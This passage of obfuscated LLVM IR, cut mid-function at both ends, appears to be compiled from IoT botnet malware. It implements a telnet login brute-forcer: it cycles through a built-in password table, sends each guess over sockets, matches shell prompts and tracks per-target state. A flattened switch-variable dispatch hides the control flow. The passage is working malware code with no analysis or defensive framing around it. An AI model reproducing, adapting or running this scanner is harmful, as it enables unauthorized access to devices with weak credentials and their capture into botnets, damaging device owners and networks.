  %999 = load i8, i8* %998, align 1
  %1000 = zext i8 %999 to i64
  %1001 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1000
  %1002 = load i8*, i8** %1001, align 8
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %.reload194 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload194, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 5
  %1007 = load i8, i8* %1006, align 1
  %1008 = zext i8 %1007 to i64
  %1009 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1008
  %1010 = load i8*, i8** %1009, align 8
  %1011 = call i64 @strlen(i8* %1010) #10
  %1012 = call i64 @send(i32 %994, i8* %1002, i64 %1011, i32 16384)
  %1013 = icmp slt i64 %1012, 0
  %1014 = select i1 %1013, i32 1300786938, i32 -767678761
  store i32 %1014, i32* %switchVar
  br label %loopEnd

; <label>:1015:                                   ; preds = %loopEntry
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %.reload193 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload193, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 16
  %1021 = call i32 @sclose(i32 %1020)
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %.reload192 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload192, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 2
  store i8 0, i8* %1025, align 8
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %.reload191 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload191, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 3
  store i8 1, i8* %1029, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1030:                                   ; preds = %loopEntry
  %1031 = load i32, i32* %2, align 4
  %1032 = sext i32 %1031 to i64
  %.reload190 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload190, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 0
  %1035 = load i32, i32* %1034, align 16
  %1036 = call i64 @send(i32 %1035, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1037 = icmp slt i64 %1036, 0
  %1038 = select i1 %1037, i32 -411830057, i32 -730492964
  store i32 %1038, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload189, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 16
  %1045 = call i32 @sclose(i32 %1044)
  %1046 = load i32, i32* %2, align 4
  %1047 = sext i32 %1046 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %1047
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1048, i32 0, i32 2
  store i8 0, i8* %1049, align 8
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 3
  store i8 1, i8* %1053, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 2
  store i8 6, i8* %1058, align 8
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:1059:                                   ; preds = %loopEntry
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 6
  %1064 = load i32, i32* %1063, align 4
  %1065 = icmp eq i32 %1064, 0
  %1066 = select i1 %1065, i32 -1759310021, i32 140600456
  store i32 %1066, i32* %switchVar
  br label %loopEnd

; <label>:1067:                                   ; preds = %loopEntry
  %1068 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 6
  store i32 %1068, i32* %1072, align 4
  store i32 140600456, i32* %switchVar
  br label %loopEnd

; <label>:1073:                                   ; preds = %loopEntry
  %1074 = load i32, i32* %2, align 4
  %1075 = sext i32 %1074 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 0
  %1078 = load i32, i32* %1077, align 16
  %1079 = load i32, i32* %2, align 4
  %1080 = sext i32 %1079 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %1080
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1081, i32 0, i32 8
  %1083 = load i8*, i8** %1082, align 8
  %1084 = load i32, i32* %2, align 4
  %1085 = sext i32 %1084 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %1085
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1086, i32 0, i32 7
  %1088 = load i16, i16* %1087, align 16
  %1089 = zext i16 %1088 to i32
  %1090 = call i32 @readUntil(i32 %1078, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1083, i32 1024, i32 %1089)
  %1091 = icmp ne i32 %1090, 0
  %1092 = select i1 %1091, i32 -1187015228, i32 1575859010
  store i32 %1092, i32* %switchVar
  br label %loopEnd

; <label>:1093:                                   ; preds = %loopEntry
  %1094 = load i32, i32* %2, align 4
  %1095 = sext i32 %1094 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 6
  store i32 0, i32* %1097, align 4
  %1098 = load i32, i32* %2, align 4
  %1099 = sext i32 %1098 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %1099
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1100, i32 0, i32 7
  store i16 0, i16* %1101, align 16
  %1102 = load i32, i32* %2, align 4
  %1103 = sext i32 %1102 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 8
  %1106 = load i8*, i8** %1105, align 8
  %1107 = call i8* @strstr(i8* %1106, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1108 = icmp ne i8* %1107, null
  %1109 = select i1 %1108, i32 777064250, i32 -742387037
  store i32 %1109, i32* %switchVar
  br label %loopEnd

; <label>:1110:                                   ; preds = %loopEntry
  %1111 = load i32, i32* %2, align 4
  %1112 = sext i32 %1111 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %1112
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 8
  %1115 = load i8*, i8** %1114, align 8
  call void @llvm.memset.p0i8.i64(i8* %1115, i8 0, i64 1024, i32 1, i1 false)
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 0
  %1120 = load i32, i32* %1119, align 16
  %1121 = call i32 @sclose(i32 %1120)
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 2
  store i8 0, i8* %1125, align 8
  %1126 = load i32, i32* %2, align 4
  %1127 = sext i32 %1126 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 3
  store i8 0, i8* %1129, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1130:                                   ; preds = %loopEntry
  %1131 = load i32, i32* %2, align 4
  %1132 = sext i32 %1131 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 8
  %1135 = load i8*, i8** %1134, align 8
  %1136 = call i32 @matchPrompt(i8* %1135)
  %1137 = icmp ne i32 %1136, 0
  %1138 = select i1 %1137, i32 2076059742, i32 200983761
  store i32 %1138, i32* %switchVar
  br label %loopEnd

; <label>:1139:                                   ; preds = %loopEntry
  %1140 = load i32, i32* %2, align 4
  %1141 = sext i32 %1140 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %1141
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1142, i32 0, i32 8
  %1144 = load i8*, i8** %1143, align 8
  call void @llvm.memset.p0i8.i64(i8* %1144, i8 0, i64 1024, i32 1, i1 false)
  %1145 = load i32, i32* %2, align 4
  %1146 = sext i32 %1145 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 0
  %1149 = load i32, i32* %1148, align 16
  %1150 = call i32 @sclose(i32 %1149)
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1153, i32 0, i32 2
  store i8 0, i8* %1154, align 8
  %1155 = load i32, i32* %2, align 4
  %1156 = sext i32 %1155 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %1156
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1157, i32 0, i32 3
  store i8 1, i8* %1158, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1159:                                   ; preds = %loopEntry
  %1160 = load i32, i32* %2, align 4
  %1161 = sext i32 %1160 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %1161
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1162, i32 0, i32 2
  store i8 7, i8* %1163, align 8
  store i32 -1392695938, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = load i32, i32* %2, align 4
  %1166 = sext i32 %1165 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 8
  %1169 = load i8*, i8** %1168, align 8
  call void @llvm.memset.p0i8.i64(i8* %1169, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1170:                                   ; preds = %loopEntry
  %1171 = load i32, i32* %2, align 4
  %1172 = sext i32 %1171 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 0
  %1175 = load i32, i32* %1174, align 16
  %1176 = load i32, i32* %2, align 4
  %1177 = sext i32 %1176 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 8
  %1180 = load i8*, i8** %1179, align 8
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 7
  %1185 = load i16, i16* %1184, align 16
  %1186 = zext i16 %1185 to i32
  %1187 = call i32 @readUntil(i32 %1175, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1180, i32 1024, i32 %1186)
  %1188 = icmp ne i32 %1187, 0
  %1189 = select i1 %1188, i32 -987240097, i32 -917562790
  store i32 %1189, i32* %switchVar
  br label %loopEnd

; <label>:1190:                                   ; preds = %loopEntry
  %1191 = load i32, i32* %2, align 4
  %1192 = sext i32 %1191 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 6
  store i32 0, i32* %1194, align 4
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 7
  store i16 0, i16* %1198, align 16
  %1199 = load i32, i32* %2, align 4
  %1200 = sext i32 %1199 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 8
  %1203 = load i8*, i8** %1202, align 8
  %1204 = call i8* @strstr(i8* %1203, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1205 = icmp ne i8* %1204, null
  %1206 = select i1 %1205, i32 2066997330, i32 926597614
  store i32 %1206, i32* %switchVar
  br label %loopEnd

; <label>:1207:                                   ; preds = %loopEntry
  %1208 = load i32, i32* %2, align 4
  %1209 = sext i32 %1208 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %1209
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1210, i32 0, i32 8
  %1212 = load i8*, i8** %1211, align 8
  call void @llvm.memset.p0i8.i64(i8* %1212, i8 0, i64 1024, i32 1, i1 false)
  %1213 = load i32, i32* %2, align 4
  %1214 = sext i32 %1213 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 0
  %1217 = load i32, i32* %1216, align 16
  %1218 = call i32 @sclose(i32 %1217)
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 2
  store i8 0, i8* %1222, align 8
  %1223 = load i32, i32* %2, align 4
  %1224 = sext i32 %1223 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 3
  store i8 0, i8* %1226, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1227:                                   ; preds = %loopEntry
  %1228 = load i32, i32* %2, align 4
  %1229 = sext i32 %1228 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %1229
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1230, i32 0, i32 8
  %1232 = load i8*, i8** %1231, align 8
  %1233 = call i32 @matchPrompt(i8* %1232)
  %1234 = icmp ne i32 %1233, 0
  %1235 = select i1 %1234, i32 -693385363, i32 249255506
  store i32 %1235, i32* %switchVar
  br label %loopEnd

; <label>:1236:                                   ; preds = %loopEntry
  %1237 = load i32, i32* %2, align 4
  %1238 = sext i32 %1237 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 8
  %1241 = load i8*, i8** %1240, align 8
  call void @llvm.memset.p0i8.i64(i8* %1241, i8 0, i64 1024, i32 1, i1 false)
  %1242 = load i32, i32* %2, align 4
  %1243 = sext i32 %1242 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %1243
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1244, i32 0, i32 0
  %1246 = load i32, i32* %1245, align 16
  %1247 = call i32 @sclose(i32 %1246)
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 2
  store i8 0, i8* %1251, align 8
  %1252 = load i32, i32* %2, align 4
  %1253 = sext i32 %1252 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %1253
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1254, i32 0, i32 3
  store i8 1, i8* %1255, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1256:                                   ; preds = %loopEntry
  %1257 = load i32, i32* %2, align 4
  %1258 = sext i32 %1257 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %1258
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1259, i32 0, i32 2
  store i8 7, i8* %1260, align 8
  store i32 -1515937322, i32* %switchVar
  br label %loopEnd

; <label>:1261:                                   ; preds = %loopEntry
  %1262 = load i32, i32* %2, align 4
  %1263 = sext i32 %1262 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 8
  %1266 = load i8*, i8** %1265, align 8
  call void @llvm.memset.p0i8.i64(i8* %1266, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1267:                                   ; preds = %loopEntry
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 0
  %1272 = load i32, i32* %1271, align 16
  %1273 = load i32, i32* %2, align 4
  %1274 = sext i32 %1273 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %1274
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1275, i32 0, i32 8
  %1277 = load i8*, i8** %1276, align 8
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 7
  %1282 = load i16, i16* %1281, align 16
  %1283 = zext i16 %1282 to i32
  %1284 = call i32 @readUntil(i32 %1272, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1277, i32 1024, i32 %1283)
  %1285 = icmp ne i32 %1284, 0
  %1286 = select i1 %1285, i32 1450065196, i32 -1598750759
  store i32 %1286, i32* %switchVar
  br label %loopEnd

; <label>:1287:                                   ; preds = %loopEntry
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 6
  store i32 0, i32* %1291, align 4
  %1292 = load i32, i32* %2, align 4
  %1293 = sext i32 %1292 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %1293
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1294, i32 0, i32 7
  store i16 0, i16* %1295, align 16
  %1296 = load i32, i32* %2, align 4
  %1297 = sext i32 %1296 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %1297
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1298, i32 0, i32 8
  %1300 = load i8*, i8** %1299, align 8
  %1301 = call i8* @strstr(i8* %1300, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1302 = icmp ne i8* %1301, null
  %1303 = select i1 %1302, i32 -857448596, i32 -734638317
  store i32 %1303, i32* %switchVar
  br label %loopEnd

; <label>:1304:                                   ; preds = %loopEntry
  %1305 = load i32, i32* %2, align 4
  %1306 = sext i32 %1305 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %1306
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1307, i32 0, i32 8
  %1309 = load i8*, i8** %1308, align 8
  call void @llvm.memset.p0i8.i64(i8* %1309, i8 0, i64 1024, i32 1, i1 false)
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 0
  %1314 = load i32, i32* %1313, align 16
  %1315 = call i32 @sclose(i32 %1314)
  %1316 = load i32, i32* %2, align 4
  %1317 = sext i32 %1316 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %1317
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1318, i32 0, i32 2
  store i8 0, i8* %1319, align 8
  %1320 = load i32, i32* %2, align 4
  %1321 = sext i32 %1320 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %1321
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1322, i32 0, i32 3
  store i8 0, i8* %1323, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1324:                                   ; preds = %loopEntry
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 8
  %1329 = load i8*, i8** %1328, align 8
  %1330 = call i32 @matchPrompt(i8* %1329)
  %1331 = icmp ne i32 %1330, 0
  %1332 = select i1 %1331, i32 426926666, i32 1529375302
  store i32 %1332, i32* %switchVar
  br label %loopEnd

; <label>:1333:                                   ; preds = %loopEntry
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 8
  %1338 = load i8*, i8** %1337, align 8
  call void @llvm.memset.p0i8.i64(i8* %1338, i8 0, i64 1024, i32 1, i1 false)
  %1339 = load i32, i32* %2, align 4
  %1340 = sext i32 %1339 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %1340
  %1342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1341, i32 0, i32 0
  %1343 = load i32, i32* %1342, align 16
